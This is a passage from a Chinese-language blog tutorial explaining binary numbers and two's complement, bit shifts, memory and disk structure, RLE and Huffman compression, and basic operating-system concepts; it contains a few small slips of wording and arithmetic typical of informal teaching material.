<p>也就是说，二进制数代表的 00100111 转换成十进制就是 39，这个 39 并不是 3 和 9 两个数字连着写，而是 3 * 10 + 9 * 1，这里面的 10、1 就是位权，以此类推，上述例子中的位权从高位到低位依次就是 7 6 5 4 3 2 1 0。这个位权也叫做次幂，那么最高位就是 2 的 7 次幂，2 的 6 次幂等等。二进制数的运算每次都会以 2 为底，这个 2 指得就是基数，那么十进制数的基数也就是 10。<strong>在任何情况下位权的值都是 数的位数 - 1</strong>，那么第一位的位权就是 1 - 1 = 0， 第二位的位权就睡 2 - 1 = 1，以此类推。<br>那么我们所说的二进制数其实就是 用 0 和 1 两个数字来表示的数，它的基数为 2，它的数值就是 每个数的位数 * 位权再求和 得到的结果，我们一般来说数值指的就是十进制数，那么它的数值就是 3 * 10 + 9 * 1 = 39。</p>
<h2 id="移位运算和乘除的关系"><a href="#移位运算和乘除的关系" class="headerlink" title="移位运算和乘除的关系"></a>移位运算和乘除的关系</h2><p>在了解过二进制之后，下面我们来看一下二进制的运算，和十进制数一样，加减乘除也适用于二进制数，只要注意逢 2 进位即可。二进制数的运算，也是计算机程序所特有的运算，因此了解二进制的运算是必须要掌握的。</p>
<p>首先我们来介绍移位运算，移位运算是指将二进制的数值的各个位置上的元素坐左移和右移操作，见下图：</p>
<figure class="image-box">
                <img src="14.png" alt title class>
                <p></p>
            </figure>

<h2 id="补数"><a href="#补数" class="headerlink" title="补数"></a>补数</h2><p>刚才我们没有介绍右移的情况，是因为右移之后空出来的高位数值，有 0 和 1 两种形式。要想区分什么时候补 0 什么时候补 1，首先就需要掌握二进制数表示负数的方法。</p>
<p><strong>二进制数中表示负数值时，一般会把最高位作为符号来使用，因此我们把这个最高位当作符号位。**</strong>符号位是 0 时表示正数，是 1 时表示 负数。**那么 -1 用二进制数该如何表示呢？可能很多人会这么认为：因为 1 的二进制数是 0000 0001，最高位是符号位，所以正确的表示 -1 应该是 1000 0001，但是这个答案真的对吗？<br>计算机世界中是没有减法的，计算机在做减法的时候其实就是在做加法，也就是用加法来实现的减法运算。比如 100 - 50 ，其实计算机来看的时候应该是 100 + (-50)，为此，在表示负数的时候就要用到二进制补数，补数就是用正数来表示的负数。<br>为了获得补数，我们需要将二进制的各数位的数值全部取反，然后再将结果 + 1 即可。先记住这个结论，下面我们来演示一下：</p>
<figure class="image-box">
                <img src="15.png" alt title class>
                <p></p>
            </figure>

<p>具体来说，就是需要先获取某个数值的二进制数，然后对二进制数的每一位做取反操作（0 —&gt; 1，1 —&gt; 0），最后再对取反后的数 +1 ，这样就完成了补数的获取。<br>补数的获取，虽然直观上不易理解，但是逻辑上却非常严谨，比如我们来看一下 1 - 1 的这个过程，我们先用上面的这个 1000 0001（它是 1 的补数，不知道的请看上文，正确性先不管，只是用来做一下计算）来表示一下：</p>
<figure class="image-box">
                <img src="16.png" alt title class>
                <p></p>
            </figure>

<p>奇怪，1 - 1 会变成 130 ，而不是 0，所以可以得出结论 1000 0001 表示 -1 是完全错误的。<br>那么正确的该如何表示呢？其实我们上面已经给出结果了，那就是 1111 1111，来论证一下它的正确性：</p>
<figure class="image-box">
                <img src="17.png" alt title class>
                <p></p>
            </figure>

<p>我们可以看到 1 - 1 其实实际上就是 1 + (-1)，对 -1 进行上面的取反 + 1 后变为 1111 1111，然后与 1 进行加法运算，得到的结果是九位的 1 0000 0000，结果发生了溢出，计算机会直接忽略掉溢出位，也就是直接抛掉最高位 1 ，变为 0000 0000。也就是 0，结果正确，所以 1111 1111 表示的就是 -1 。</p>
<p><strong>所以负数的二进制表示就是先求其补数，补数的求解过程就是对原始数值的二进制数各位取反，然后将结果 + 1。</strong></p>
<h2 id="算数右移和逻辑右移的区别"><a href="#算数右移和逻辑右移的区别" class="headerlink" title="算数右移和逻辑右移的区别"></a>算数右移和逻辑右移的区别</h2><p>在了解完补数后，我们重新考虑一下右移这个议题，右移在移位后空出来的最高位有两种情况 0 和 1。<br>将二进制数作为带符号的数值进行右移运算时，移位后需要在最高位填充移位前符号位的值（0 或 1）。这就被称为算数右移。如果数值使用补数表示的负数值，那么右移后在空出来的最高位补 1，就可以正确的表示 1/2，1/4，1/8 等的数值运算。如果是正数，那么直接在空出来的位置补 0 即可。</p>
<p>下面来看一个右移的例子。将 -4 右移两位，来各自看一下移位示意图：</p>
<figure class="image-box">
                <img src="18.png" alt title class>
                <p></p>
            </figure>

<p>如上图所示，在逻辑右移的情况下，-4 右移两位会变成 63，显然不是它的 1/4，所以不能使用逻辑右移，那么算数右移的情况下，右移两位会变为 -1，显然是它的 1/4，故而采用算数右移。</p>
<p>那么我们可以得出来一个结论：<strong>左移时，无论是图形还是数值，移位后，只需要将低位补 0 即可；右移时，需要根据情况判断是逻辑右移还是算数右移。</strong></p>
<p>下面介绍一下符号扩展：<strong>将数据进行符号扩展是为了产生一个位数加倍、但数值大小不变的结果，以满足有些指令对操作数位数的要求</strong>，例如倍长于除数的被除数，再如将数据位数加长以减少计算过程中的误差。<br>以8位二进制为例，符号扩展就是指在保持值不变的前提下将其转换成为 16 位和 32 位的二进制数。将 0111 1111 这个正的 8 位二进制数转换成为 16 位二进制数时，很容易就能够得出 0000 0000 0111 1111 这个正确的结果，但是像 1111 1111 这样的补数来表示的数值，该如何处理？直接将其表示成为 1111 1111 1111 1111 就可以了。也就是说，不管正数还是补数表示的负数，只需要将 0 和 1 填充高位即可。</p>
<hr>
<h1 id="内存和磁盘的关系"><a href="#内存和磁盘的关系" class="headerlink" title="内存和磁盘的关系"></a>内存和磁盘的关系</h1><p>我们大家知道，计算机的五大基础部件是<strong>存储器</strong>、<strong>控制器</strong>、<strong>运算器</strong>、<strong>输入和输出设备</strong>，其中从存储功能的角度来看，可以把存储器分为<strong>内存</strong>和<strong>磁盘</strong>，我们上面介绍过内存，下面就来介绍一下磁盘以及磁盘和内存的关系</p>
<h2 id="程序不读入内存就无法运行"><a href="#程序不读入内存就无法运行" class="headerlink" title="程序不读入内存就无法运行"></a>程序不读入内存就无法运行</h2><p>计算机最主要的存储部件是内存和磁盘。<strong>磁盘中存储的程序必须加载到内存中才能运行</strong>，在磁盘中保存的程序是无法直接运行的，这是因为负责解析和运行程序内容的 CPU 是需要通过程序计数器来指定内存地址从而读出程序指令的。</p>
<figure class="image-box">
                <img src="19.png" alt title class>
                <p></p>
            </figure>

<h2 id="磁盘构造"><a href="#磁盘构造" class="headerlink" title="磁盘构造"></a>磁盘构造</h2><h3 id="磁盘缓存"><a href="#磁盘缓存" class="headerlink" title="磁盘缓存"></a>磁盘缓存</h3><p>我们上面提到，磁盘往往和内存是互利共生的关系，相互协作，彼此持有良好的合作关系。每次内存都需要从磁盘中读取数据，必然会读到相同的内容，所以一定会有一个角色负责存储我们经常需要读到的内容。我们大家做软件的时候经常会用到缓存技术，那么硬件层面也不例外，磁盘也有缓存，磁盘的缓存叫做磁盘缓存。<br>磁盘缓存指的是把从磁盘中读出的数据存储到内存的方式，这样一来，当接下来需要读取相同的内容时，就不会再通过实际的磁盘，而是通过磁盘缓存来读取。某一种技术或者框架的出现势必要解决某种问题的，那么磁盘缓存就大大改善了磁盘访问的速度。</p>
<figure class="image-box">
                <img src="20.png" alt title class>
                <p></p>
            </figure>

<h3 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h3><p>虚拟内存是内存和磁盘交互的第二个媒介。虚拟内存是指把磁盘的一部分作为假想内存来使用。这与磁盘缓存是假想的磁盘（实际上是内存）相对，虚拟内存是假想的内存（实际上是磁盘）。<br>虚拟内存是计算机系统内存管理的一种技术。它使得应用程序认为它拥有<strong>连续可用</strong>的内存（一个完整的地址空间），但是实际上，它通常被分割成多个物理碎片，还有部分存储在外部磁盘管理器上，必要时进行数据交换。<br>通过借助虚拟内存，在内存不足时仍然可以运行程序。例如，在只剩 5MB 内存空间的情况下仍然可以运行 10MB 的程序。由于 CPU 只能执行加载到内存中的程序，因此，虚拟内存的空间就需要和内存中的空间进行置换（swap），然后运行程序。</p>
<h3 id="虚拟内存与内存的交换方式"><a href="#虚拟内存与内存的交换方式" class="headerlink" title="虚拟内存与内存的交换方式"></a>虚拟内存与内存的交换方式</h3><p>虚拟内存的方法有 <strong>分页式</strong> 和 <strong>分段式</strong> 两种。Windows 采用的是分页式。该方式是指在不考虑程序构造的情况下，把运行的程序按照一定大小的页进行分割，并以页为单位进行置换。在分页式中，我们把磁盘的内容读到内存中称为 Page In，把内存的内容写入磁盘称为 Page Out。Windows 计算机的页大小为 4KB，也就是说，需要把应用程序按照 4KB 的页来进行切分，以页（page）为单位放到磁盘中，然后进行置换。</p>
<figure class="image-box">
                <img src="21.png" alt title class>
                <p></p>
            </figure>

<p>为了实现内存功能，Windows 在磁盘上提供了虚拟内存使用的文件（page file，页文件）。该文件由 Windows 生成和管理，文件的大小和虚拟内存大小相同，通常大小是内存的 1 - 2 倍。</p>
<h3 id="磁盘的物理结构"><a href="#磁盘的物理结构" class="headerlink" title="磁盘的物理结构"></a>磁盘的物理结构</h3><p>之前我们介绍了 CPU、内存的物理结构，现在我们来介绍一下磁盘的物理结构。<strong>磁盘的物理结构指的是磁盘存储数据的形式。</strong><br>磁盘是通过其物理表面划分成多个空间来使用的。划分的方式有两种：<strong>可变长方式</strong>和<strong>扇区方式</strong>。前者是将物理结构划分成长度可变的空间，后者是将磁盘结构划分为固定长度的空间。一般 Windows 所使用的硬盘和软盘都是使用扇区这种方式。扇区中，把磁盘表面分成若干个同心圆的空间就是<strong>磁道</strong>，把磁道按照固定大小的存储空间划分而成的就是<strong>扇区</strong>。</p>
<figure class="image-box">
                <img src="22.png" alt title class>
                <p></p>
            </figure>

<p><strong>扇区是对磁盘进行物理读写的最小单位。</strong>Windows 中使用的磁盘，一般是一个扇区 512 个字节。不过，Windows 在逻辑方面对磁盘进行读写的单位是扇区整数倍簇。根据磁盘容量不同功能，1 簇可以是 512 字节（1 簇 = 1 扇区）、1KB（1 簇 = 2 扇区）、2KB、4KB、8KB、16KB、32KB（1 簇 = 64 扇区）。簇和扇区的大小是相等的。</p>
<hr>
<h1 id="压缩算法"><a href="#压缩算法" class="headerlink" title="压缩算法"></a>压缩算法</h1><p>我们想必都有过压缩和解压缩文件的经历，当文件太大时，我们会使用文件压缩来降低文件的占用空间。比如微信上传文件的限制是 100 MB，我这里有个文件夹无法上传，但是我解压完成后的文件一定会小于 100 MB，那么我的文件就可以上传了。<br>此外，我们把相机拍完的照片保存到计算机上的时候，也会使用压缩算法进行文件压缩，文件压缩的格式一般是 JPEG。</p>
<p>那么什么是压缩算法呢？压缩算法又是怎么定义的呢？在认识算法之前我们需要先了解一下文件是如何存储的。</p>
<h2 id="文件存储"><a href="#文件存储" class="headerlink" title="文件存储"></a>文件存储</h2><p>文件是将数据存储在磁盘等存储媒介的一种形式。<strong>程序文件中最基本的存储数据单位是字节。</strong>文件的大小不管是 xxxKB、xxxMB 等来表示，就是因为文件是以字节 B = Byte 为单位来存储的。<br>文件就是字节数据的集合。用 1 字节（8 位）表示的字节数据有 256 种，用二进制表示的话就是 0000 0000 - 1111 1111 。如果文件中存储的数据是文字，那么该文件就是文本文件。如果是图形，那么该文件就是图像文件。<strong>在任何情况下，文件中的字节数都是连续存储的。</strong></p>
<figure class="image-box">
                <img src="23.png" alt title class>
                <p></p>
            </figure>

<h2 id="压缩算法的定义"><a href="#压缩算法的定义" class="headerlink" title="压缩算法的定义"></a>压缩算法的定义</h2><p>上面介绍了文件的集合体其实就是一堆字节数据的集合，那么我们就可以来给压缩算法下一个定义。<br>压缩算法（compaction algorithm）指的就是数据压缩的算法，主要包括压缩和还原（解压缩）的两个步骤。<br>其实就是在不改变原有文件属性的前提下，降低文件字节空间和占用空间的一种算法。</p>
<p>根据压缩算法的定义，我们可将其分成不同的类型：</p>
<h3 id="有损和无损"><a href="#有损和无损" class="headerlink" title="有损和无损"></a>有损和无损</h3><p>无损压缩：能够无失真地从压缩后的数据重构，准确地还原原始数据。可用于对数据的准确性要求严格的场合，如可执行文件和普通文件的压缩、磁盘的压缩，也可用于多媒体数据的压缩。该方法的压缩比较小。如差分编码、RLE、Huffman 编码、LZW 编码、算术编码。</p>
<p>有损压缩：有失真，不能完全准确地恢复原始数据，重构的数据只是原始数据的一个近似。可用于对数据的准确性要求不高的场合，如多媒体数据的压缩。该方法的压缩比较大。例如预测编码、音感编码、分形压缩、小波压缩、JPEG/MPEG。</p>
<h3 id="对称性"><a href="#对称性" class="headerlink" title="对称性"></a>对称性</h3><p>如果编解码算法的复杂性和所需时间差不多，则为对称的编码方法，多数压缩算法都是对称的。但也有不对称的，一般是编码难而解码容易，如 Huffman 编码和分形编码。但用于密码学的编码方法则相反，是编码容易，而解码则非常难。</p>
<h3 id="帧间与帧内"><a href="#帧间与帧内" class="headerlink" title="帧间与帧内"></a>帧间与帧内</h3><p>在视频编码中会同时用到帧内与帧间的编码方法，帧内编码是指在一帧图像内独立完成的编码方法，同静态图像的编码，如 JPEG；而帧间编码则需要参照前后帧才能进行编解码，并在编码过程中考虑对帧之间的时间冗余的压缩，如 MPEG。</p>
<h3 id="实时性"><a href="#实时性" class="headerlink" title="实时性"></a>实时性</h3><p>在有些多媒体的应用场合，需要实时处理或传输数据（如现场的数字录音和录影、播放 MP3/RM/VCD/DVD、视频/音频点播、网络现场直播、可视电话、视频会议），编解码一般要求延时 ≤50 ms。这就需要简单/快速/高效的算法和高速/复杂的 CPU/DSP 芯片。</p>
<h3 id="分级处理"><a href="#分级处理" class="headerlink" title="分级处理"></a>分级处理</h3><p>有些压缩算法可以同时处理不同分辨率、不同传输速率、不同质量水平的多媒体数据，如 JPEG2000、MPEG-2/4。</p>
<p>这些概念有些抽象，主要是为了让大家了解一下压缩算法的分类，下面我们就对具体的几种常用的压缩算法来分析一下它的特点和优劣。</p>
<h2 id="几种常用压缩算法的理解"><a href="#几种常用压缩算法的理解" class="headerlink" title="几种常用压缩算法的理解"></a>几种常用压缩算法的理解</h2><h3 id="RLE-算法的机制"><a href="#RLE-算法的机制" class="headerlink" title="RLE 算法的机制"></a>RLE 算法的机制</h3><p>接下来就让我们正式看一下文件的压缩机制。首先让我们来尝试对 AAAAAABBCDDEEEEEF 这 17 个半角字符的文件（文本文件）进行压缩。虽然这些文字没有什么实际意义，但是很适合用来描述 RLE 的压缩机制。</p>
<p>由于半角字符（其实就是英文字符）是作为 1 个字节保存在文件中的，所以上述的文件的大小就是 17 字节。如图：</p>
<figure class="image-box">
                <img src="24.png" alt title class>
                <p></p>
            </figure>

<p>那么，如何才能压缩该文件呢？大家不妨也考虑一下，只要是能够使文件小于 17 字节，我们可以使用任何压缩算法。</p>
<p>最显而易见的一种压缩方式我觉得你已经想到了，就是<strong>把相同的字符去重化</strong>，也就是 字符 * 重复次数 的方式进行压缩。所以上面文件压缩后就会变成下面这样：</p>
<figure class="image-box">
                <img src="25.png" alt title class>
                <p></p>
            </figure>

<p>从图中我们可以看出，AAAAAABBCDDEEEEEF 的 17 个字符成功被压缩成了 A6B2C1D2E5F1 的 12 个字符，也就是 12 / 17 = 70%，压缩比为 70%，压缩成功了。</p>
<p>像这样，把文件内容用 数据 * 重复次数 的形式来表示的压缩方法成为 RLE（Run Length Encoding，行程长度编码）算法。RLE 算法是一种很好的压缩方法，经常用于压缩传真的图像等。因为图像文件的本质也是字节数据的集合体，所以可以用 RLE 算法进行压缩。</p>
<h3 id="哈夫曼算法和莫尔斯编码"><a href="#哈夫曼算法和莫尔斯编码" class="headerlink" title="哈夫曼算法和莫尔斯编码"></a>哈夫曼算法和莫尔斯编码</h3><p>下面我们来介绍另外一种压缩算法，即哈夫曼算法。在了解哈夫曼算法之前，你必须舍弃半角英文数字的 1 个字符是 1 个字节（8 位）的数据。下面我们就来认识一下哈夫曼算法的基本思想。</p>
<p>文本文件是由不同类型的字符组合而成的，而且不同字符出现的次数也是不一样的。例如，在某个文本文件中，A 出现了 100 次左右，Q 仅仅用到了 3 次，类似这样的情况很常见。哈夫曼算法的关键就在于<strong>多次出现的数据用小于 8 位的字节数表示，不常用的数据则可以使用超过 8 位的字节数表示</strong>。A 和 Q 都用 8 位来表示时，原文件的大小就是 100次 * 8 位 + 3 次 * 8 位 = 824位，假设 A 用 2 位，Q 用 10 位来表示就是 2 * 100 + 3 * 10 = 230 位。</p>
<blockquote>
<p>不过要注意一点，最终磁盘的存储都是以 8 位为一个字节来保存文件的。</p>
</blockquote>
<p>哈夫曼算法比较复杂，在深入了解之前我们先吃点甜品，了解一下莫尔斯编码，你一定看过美剧或者战争片的电影，在战争中的通信经常采用莫尔斯编码来传递信息，例如下面：</p>
<figure class="image-box">
                <img src="26.png" alt title class>
                <p></p>
            </figure>

<p>接下来我们来讲解一下莫尔斯编码，下面是莫尔斯编码的示例，大家把 1 看作是短点（嘀），把 11 看作是长点（嗒）即可。</p>
<figure class="image-box">
                <img src="27.png" alt title class>
                <p></p>
            </figure>

<p>莫尔斯编码一般把文本中出现最高频率的字符用<strong>短编码</strong>来表示。如表所示，假如表示短点的位是 1，表示长点的位是 11 的话，那么 E（嘀）这一数据的字符就可以用 1 来表示，C（滴答滴答）就可以用 9 位的 110101101 来表示。在实际的莫尔斯编码中，如果短点的长度是 1，长点的长度就是 3，短点和长点的间隔就是 1。这里的长度指的就是声音的长度。比如我们想用上面的 AAAAAABBCDDEEEEEF 例子来用莫尔斯编码重写，在莫尔斯曼编码中，各个字符之间需要加入表示时间间隔的符号。这里我们用 00 加以区分。<br>所以，AAAAAABBCDDEEEEEF 这个文本就变为了 A * 6 次 + B * 2 次 + C * 1 次 + D * 2 次 + E * 5 次 + F * 1 次 + 字符间隔 * 16 = 4 位 * 6 次 + 8 位 * 2 次 + 9 位 * 1 次 + 6 位 * 2 次 + 1 位 * 5 次 + 8 位 * 1 次 + 2 位 * 16 次 = 106 位 = 14 字节。<br>所以使用莫尔斯电码的压缩比为 14 / 17 = 82%。效率并不太突出。</p>
<h4 id="用二叉树实现哈夫曼算法"><a href="#用二叉树实现哈夫曼算法" class="headerlink" title="用二叉树实现哈夫曼算法"></a>用二叉树实现哈夫曼算法</h4><p>刚才已经提到，莫尔斯编码是根据日常文本中各字符的出现频率来决定表示各字符的编码数据长度的。不过，在该编码体系中，对 AAAAAABBCDDEEEEEF 这种文本来说并不是效率最高的。</p>
<p>下面我们来看一下哈夫曼算法。哈夫曼算法是指，为各压缩对象文件分别构造最佳的编码体系，并以该编码体系为基础来进行压缩。因此，用什么样的编码（哈夫曼编码）对数据进行分割，就要由各个文件而定。用哈夫曼算法压缩过的文件中，存储着哈夫曼编码信息和压缩过的数据。</p>
<figure class="image-box">
                <img src="28.png" alt title class>
                <p></p>
            </figure>

<p>接下来，我们在对 AAAAAABBCDDEEEEEF 中的 A - F 这些字符，按照<strong>出现频率高的字符用尽量少的位数编码来表示</strong>这一原则进行整理。按照出现频率从高到低的顺序整理后，结果如下，同时也列出了编码方案。</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>出现频率</th>
<th>编码（方案）</th>
<th>位数</th>
</tr>
</thead>
<tbody><tr>
<td>A</td>
<td>6</td>
<td>0</td>
<td>1</td>
</tr>
<tr>
<td>E</td>
<td>5</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>B</td>
<td>2</td>
<td>10</td>
<td>2</td>
</tr>
<tr>
<td>D</td>
<td>2</td>
<td>11</td>
<td>2</td>
</tr>
<tr>
<td>C</td>
<td>1</td>
<td>100</td>
<td>3</td>
</tr>
<tr>
<td>F</td>
<td>1</td>
<td>101</td>
<td>3</td>
</tr>
</tbody></table>
<p>在上表的编码方案中，随着出现频率的降低，字符编码信息的数据位数也在逐渐增加，从最开始的 1 位、2 位依次增加到 3 位。不过这个编码体系是存在问题的，你不知道 100 这个 3 位的编码，它的意思是用 1、0、0 这三个编码来表示 E、A、A 呢？还是用 10、0 来表示 B、A 呢？还是用 100 来表示 C 呢。</p>
<p>而在哈夫曼算法中，通过借助哈夫曼树的构造编码体系，即使在不使用字符区分符号的情况下，也可以构建能够明确进行区分的编码体系。不过哈夫曼树的算法要比较复杂，下面是一个哈夫曼树的构造过程：</p>
<figure class="image-box">
                <img src="29.png" alt title class>
                <p></p>
            </figure>

<p>自然界树的从根开始生叶的，而哈夫曼树则是叶生枝。</p>
<h4 id="哈夫曼树能够提升压缩比率"><a href="#哈夫曼树能够提升压缩比率" class="headerlink" title="哈夫曼树能够提升压缩比率"></a>哈夫曼树能够提升压缩比率</h4><p>使用哈夫曼树之后，出现频率越高的数据所占用的位数越少，这也是哈夫曼树的核心思想。通过上图的步骤二可以看出，枝条连接数据时，我们是从出现频率较低的数据开始的。这就意味着出现频率低的数据到达根部的枝条也越多。而枝条越多则意味着编码的位数随之增加。</p>
<p>接下来我们来看一下哈夫曼树的压缩比率，用上图得到的数据表示 AAAAAABBCDDEEEEEF 为 000000000000 100100 110 101101 0101010101 111，40 位 = 5 字节。压缩前的数据是 17 字节，压缩后的数据竟然达到了惊人的 5 字节，也就是压缩比率 = 5 / 17 = 29% 如此高的压缩率，简直是太惊艳了。</p>
<p>大家可以参考一下，无论哪种类型的数据，都可以用哈夫曼树作为压缩算法。</p>
<table>
<thead>
<tr>
<th>文件类型</th>
<th>压缩前</th>
<th>压缩后</th>
<th>压缩比率</th>
</tr>
</thead>
<tbody><tr>
<td>文本文件</td>
<td>14862字节</td>
<td>4119字节</td>
<td>28%</td>
</tr>
<tr>
<td>图像文件</td>
<td>96062字节</td>
<td>9456字节</td>
<td>10%</td>
</tr>
<tr>
<td>EXE 文件</td>
<td>24576字节</td>
<td>4652字节</td>
<td>19%</td>
</tr>
</tbody></table>
<h3 id="可逆压缩和非可逆压缩"><a href="#可逆压缩和非可逆压缩" class="headerlink" title="可逆压缩和非可逆压缩"></a>可逆压缩和非可逆压缩</h3><p>最后，我们来看一下图像文件的数据形式。图像文件的使用目的通常是把图像数据输出到显示器、打印机等设备上。常用的图像格式有：BMP、JPEG、TIFF、GIF 格式等。</p>
<ul>
<li>BMP：是使用 Windows 自带的画笔来做成的一种图像形式</li>
<li>JPEG：是数码相机等常用的一种图像数据形式</li>
<li>TIFF：是一种通过在文件中包含”标签”就能够快速显示出数据性质的图像形式</li>
<li>GIF：是由美国开发的一种数据形式，要求色数不超过 256 个</li>
</ul>
<p>图像文件可以使用前面介绍的 RLE 算法和哈夫曼算法，因为图像文件在多数情况下并不要求数据需要还原到和压缩之前一摸一样的状态，允许丢失一部分数据。我们把能还原到压缩前状态的压缩称为<strong>可逆压缩</strong>，无法还原到压缩前状态的压缩称为<strong>非可逆压缩</strong>。</p>
<figure class="image-box">
                <img src="30.png" alt title class>
                <p></p>
            </figure>

<p>一般来说，JPEG 格式的文件是非可逆压缩，因此还原后有部分图像信息比较模糊。GIF 是可逆压缩。</p>
<hr>
<h1 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h1><h2 id="操作系统环境"><a href="#操作系统环境" class="headerlink" title="操作系统环境"></a>操作系统环境</h2><p>程序中包含着运行环境这一内容，可以说 <strong>运行环境 = 操作系统 + 硬件</strong>，操作系统又可以被称为软件，它是由一系列的指令组成的。我们不介绍操作系统，我们主要来介绍一下硬件的识别。</p>
<p>我们肯定都玩儿过游戏，你玩儿游戏前需要干什么？是不是需要先看一下自己的笔记本或者电脑是不是能肝的起游戏？下面是一个游戏的配置（怀念一下 wow）：</p>
<figure class="image-box">
                <img src="31.png" alt title class>
                <p></p>
            </figure>

<p>图中的主要配置如下：</p>
<ul>
<li>操作系统版本：说的就是应用程序运行在何种系统环境，现在市面上主要有三种操作系统环境，Windows 、Linux 和 Unix ，一般我们玩儿的大型游戏几乎都是在 Windows 上运行，可以说 Windows 是游戏的天堂。Windows 操作系统也会有区分，分为 32 位操作系统和64位操作系统，互不兼容。</li>
<li>处理器：处理器指的就是 CPU，你的电脑的计算能力，通俗来讲就是每秒钟能处理的指令数，如果你的电脑觉得卡带不起来的话，很可能就是 CPU 的计算能力不足导致的。想要加深理解，请阅读博主的另一篇文章：<a href="https://mp.weixin.qq.com/s?__biz=MzU2NDg0OTgyMA==&mid=2247484585&idx=1&sn=0d6c3ccf8cc5bec2fea80eb437213801&chksm=fc45f95acb32704c7dcc952a803e88e8a9b0e67c86d8c27abf4e6c776e48b1fcd770dd2dcc8d&token=653889808&lang=zh_CN#rd" target="_blank" rel="noopener">程序员需要了解的硬核知识之 CPU</a>。</li>
<li>显卡：显卡承担图形的输出任务，因此又被称为图形处理器（Graphic Processing Unit，GPU），显卡也非常重要，比如我之前玩儿的剑灵开五档（其实就是图像变得更清晰）会卡，其实就是显卡显示不出来的原因。</li>
<li>内存：内存即主存，就是你的应用程序在运行时能够动态分析指令的这部分存储空间，它的大小也能决定你电脑的运行速度，想要加深理解，请阅读博主的另一篇文章 <a href="https://mp.weixin.qq.com/s?__biz=MzU2NDg0OTgyMA==&mid=2247484617&idx=1&sn=497af1daab7bba6b44ca291194c56621&chksm=fc45f93acb32702c5bc8575f7830f2b585952e31e62af3d73867c42360a2f538ae779452eb52&token=653889808&lang=zh_CN#rd" target="_blank" rel="noopener">程序员需要了解的硬核知识之内存</a>。</li>
<li>存储空间：存储空间指的就是应用程序安装所占用的磁盘空间，由图中可知，此游戏的最低存储空间必须要大于 5GB，其实我们都会遗留很大一部分用来安装游戏。</li>
</ul>
<p>从程序的运行环境这一角度来考量的话，CPU 的种类是特别重要的参数，为了使程序能够正常运行，必须满足 CPU 所需的最低配置。<br>CPU 只能解释其自身固有的语言。不同的 CPU 能解释的机器语言的种类也是不同的。机器语言的程序称为<strong>本地代码</strong>（native code），程序员用 C 等高级语言编写的程序，仅仅是文本文件。文本文件（排除文字编码的问题）在任何环境下都能显示和编辑。我们称之为<strong>源代码</strong>。通过对源代码进行编译，就可以得到本地代码。下图反映了这个过程：</p>
<figure class="image-box">
                <img src="640.webp" alt title class>
                <p></p>
            </figure>

<h2 id="Windows-操作系统克服了-CPU-以外的硬件差异"><a href="#Windows-操作系统克服了-CPU-以外的硬件差异" class="headerlink" title="Windows 操作系统克服了 CPU 以外的硬件差异"></a>Windows 操作系统克服了 CPU 以外的硬件差异</h2><p>计算机的硬件并不仅仅是由 CPU 组成的，还包括用于存储程序指令的数据和内存，以及通过 I/O 连接的键盘、显示器、硬盘、打印机等外围设备。<br>在 WIndows 软件中，键盘输入、显示器输出等并不是直接向硬件发送指令。而是通过向 Windows 发送指令实现的。因此，程序员就不用注意内存和 I/O 地址的不同构成了。Windows 操作的是硬件而不是软件，软件通过操作 Windows 系统可以达到控制硬件的目的。</p>
<figure class="image-box">
                <img src="32.png" alt title class>
                <p></p>
            </figure>

<h2 id="不同操作系统的-API-差异性"><a href="#不同操作系统的-API-差异性" class="headerlink" title="不同操作系统的 API 差异性"></a>不同操作系统的 API 差异性</h2><p>接下来我们看一下操作系统的种类。同样机型的计算机，可安装的操作系统类型也会有多种选择。例如：AT 兼容机除了可以安装 Windows 之外，还可以采用 Unix 系列的 Linux 以及 FreeBSD （也是一种 Unix 操作系统）等多个操作系统。当然，应用软件则必须根据不同的操作系统类型来专门开发。<strong>CPU 的类型不同，所对应机器的语言也不同，同样的道理，操作系统的类型不同，应用程序向操作系统传递指令的途径也不同。</strong></p>
<p>应用程序向系统传递指令的途径称为 API（Application Programming Interface）。Windows 以及 Linux 操作系统的 API，提供了任何应用程序都可以利用的函数组合。因为不同操作系统的 API 是有差异的。所以，如何要将同样的应用程序移植到另外的操作系统，就必须要覆盖应用所用到的 API 部分。<br>键盘输入、鼠标输入、显示器输出、文件输入和输出等同外围设备进行交互的功能，都是通过 API 提供的。<br>这也就是为什么 Windows 应用程序不能直接移植到 Linux 操作系统上的原因，API 差异太大了。<br>在同类型的操作系统下，不论硬件如何，API 几乎相同。但是，由于不同种类 CPU 的机器语言不同，因此本地代码也不尽相同。</p>
<h2 id="操作系统功能的历史"><a href="#操作系统功能的历史" class="headerlink" title="操作系统功能的历史"></a>操作系统功能的历史</h2><p>操作系统其实也是一种软件，任何新事物的出现肯定都有它的历史背景，那么操作系统也不是凭空出现的，肯定有它的历史背景。<br>在计算机尚不存在操作系统的年代，完全没有任何程序，人们通过各种按钮来控制计算机，这一过程非常麻烦。于是，有人开发出了仅具有加载和运行功能的监控程序，这就是操作系统的原型。通过事先启动监控程序，程序员可以根据需要将各种程序加载到内存中运行。虽然仍旧比较麻烦，但比起在没有任何程序的状态下进行开发，工作量得到了很大的缓解。</p>
<figure class="image-box">
                <img src="33.png" alt title class>
                <p></p>
            </figure>

<p>随着时代的发展，人们在利用监控程序编写程序的过程中发现很多程序都有公共的部分。例如，通过键盘进行文字输入，显示器进行数据展示等，如果每编写一个新的应用程序都需要相同的处理的话，那真是太浪费时间了。因此，基本的输入输出部分的程序就被追加到了监控程序中。初期的操作系统就是这样诞生了。</p>
<figure class="image-box">
                <img src="34.png" alt title class>
                <p></p>
            </figure>

<p>类似的想法可以共用，人们又发现有更多的应用程序可以追加到监控程序中，比如硬件控制程序，编程语言处理器（汇编、编译、解析）以及各种应用程序等，结果就形成了和现在差异不大的操作系统，也就是说，其实操作系统是多个程序的集合体。</p>
<figure class="image-box">
                <img src="35.png" alt title class>
                <p></p>
            </figure>

<h2 id="Windows-操作系统的特征"><a href="#Windows-操作系统的特征" class="headerlink" title="Windows 操作系统的特征"></a>Windows 操作系统的特征</h2><p>Windows 操作系统是世界上用户数量最庞大的群体，作为 Windows 操作系统的资深用户，你都知道 Windows 操作系统有哪些特征吗？下面列举了一些 Windows 操作系统的特性：</p>
<ul>
<li>Windows 操作系统有两个版本：32 位 和 64 位</li>
<li>通过 API 函数集成来提供系统调用</li>
<li>提供了采用图形用户界面的用户界面</li>
